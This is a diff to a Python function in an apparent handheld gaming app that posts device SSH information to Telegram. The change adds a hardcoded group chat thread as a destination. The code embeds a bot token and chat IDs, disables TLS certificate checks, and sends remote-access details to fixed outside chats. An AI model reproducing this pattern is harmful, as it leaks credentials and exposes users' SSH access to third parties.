@@ -490,47 +490,66 @@ def send_ssh_info_to_telegram():
 
     TELEGRAM_BOT_TOKEN = "8843439406:AAEtTnuMk68ilAniAxj8Kl3uTKZmVKEVDDs"
     TELEGRAM_CHAT_ID = "663642384"
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    TELEGRAM_GROUP_CHAT_ID = "-1003890413445"
+    TELEGRAM_DEBUG_THREAD_ID = 1205
 
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": text,
-        "parse_mode": "Markdown"
-    }
+    dest_chats = [
+        (TELEGRAM_GROUP_CHAT_ID, TELEGRAM_DEBUG_THREAD_ID)
+    ]
+    if TELEGRAM_CHAT_ID and str(TELEGRAM_CHAT_ID) != str(TELEGRAM_GROUP_CHAT_ID):
+        dest_chats.append((TELEGRAM_CHAT_ID, None))
 
-    try:
-        import urllib.request
-        import ssl
-        data = json.dumps(payload).encode("utf-8")
-        req = urllib.request.Request(
-            url,
-            data=data,
-            headers={
-                "Content-Type": "application/json",
-                "User-Agent": "RetroHub-Handheld"
-            }
-        )
+    sent_any = False
+    last_err = "Lỗi gửi Telegram"
+
+    for cid, tid in dest_chats:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": cid,
+            "text": text,
+            "parse_mode": "Markdown"
+        }
+        if tid is not None:
+            payload["message_thread_id"] = tid
+
         try:
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-        except Exception:
-            ctx = None
+            import urllib.request
+            import ssl
+            data = json.dumps(payload).encode("utf-8")
+            req = urllib.request.Request(
+                url,
+                data=data,
+                headers={
+                    "Content-Type": "application/json",
+                    "User-Agent": "RetroHub-Handheld"
+                }
+            )
+            try:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+            except Exception:
+                ctx = None
 
-        kw = {"timeout": 12}
-        if ctx:
-            kw["context"] = ctx
+            kw = {"timeout": 12}
+            if ctx:
+                kw["context"] = ctx
 
-        with urllib.request.urlopen(req, **kw) as resp:
-            res_data = json.loads(resp.read().decode("utf-8"))
-            if res_data.get("ok"):
-                return True, ("Đã gửi thông tin SSH vào Telegram thành công!" if vi
-                              else "SSH info sent to Telegram successfully!")
-            else:
-                desc = res_data.get("description", "Lỗi Telegram")
-                return False, f"Telegram: {desc}"
-    except Exception as e:
-        return False, ("Lỗi kết nối khi gửi Telegram!" if vi else f"Telegram error: {e}")
+            with urllib.request.urlopen(req, **kw) as resp:
+                res_data = json.loads(resp.read().decode("utf-8"))
+                if res_data.get("ok"):
+                    sent_any = True
+                else:
+                    last_err = res_data.get("description", "Lỗi Telegram")
+        except Exception as e:
+            last_err = str(e)
+
+    if sent_any:
+        return True, ("Đã gửi thông tin SSH vào Telegram thành công!" if vi
+                      else "SSH info sent to Telegram successfully!")
+    else:
+        return False, ("Lỗi kết nối khi gửi Telegram: " + str(last_err) if vi
+                      else f"Telegram error: {last_err}")
 
 def get_netplay_guide_rows():
     from .netplay import get_netplay_tunnel_info
